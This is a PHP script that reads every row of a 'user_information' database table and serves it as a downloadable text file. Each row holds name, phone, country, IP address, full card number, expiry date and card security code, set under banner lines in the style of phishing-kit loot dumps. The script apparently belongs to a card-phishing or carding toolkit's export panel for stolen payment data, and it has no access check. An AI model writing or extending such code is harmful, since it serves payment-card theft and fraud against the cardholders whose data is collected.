<?php

require_once 'config.php';
$sql = "SELECT * FROM user_information";
$result = $conn->query($sql);

// create text file content
$content = "\n";

while($row = $result->fetch_assoc()) {
    $fullname = $row["fullname"];
    $id = $row['id'];
    $country = $row['countryName'];
    $phone = $row['phone'];
    $idnumber = $row['idnumber'];
    $content .= "#--------------------------------[ $id ] ]----------------------------#\n";
    $content .= "Fullname: $fullname\n";
    $content .= "Address: $idnumber\n";
    $content .= "Phone: $phone\n";
    $content .= "Country: $country\n";
    $content .= "#--------------------------------[ Card INFO ] ]----------------------------#\n";
    $cardnumber = $row['cardnumber'];
    $exp_date = $row['exp_date'];
    $card_code = $row['card_code'];
    $content .= "Card number: $cardnumber\n";
    $content .= "Expiration Date: $exp_date\n";
    $content .= "Card Code: $card_code \n";
    $content .= "#--------------------------------[ Localization ] ]----------------------------#\n";
    $ipaddress = $row['ipaddress'];
    $content .= "IP: $ipaddress\n\n\n";

}

// set headers to force file download
header('Content-Type: text/plain');
header('Content-Disposition: attachment; filename="user_information.txt"');

// output file content to user
echo $content;

// close database connection
$conn->close();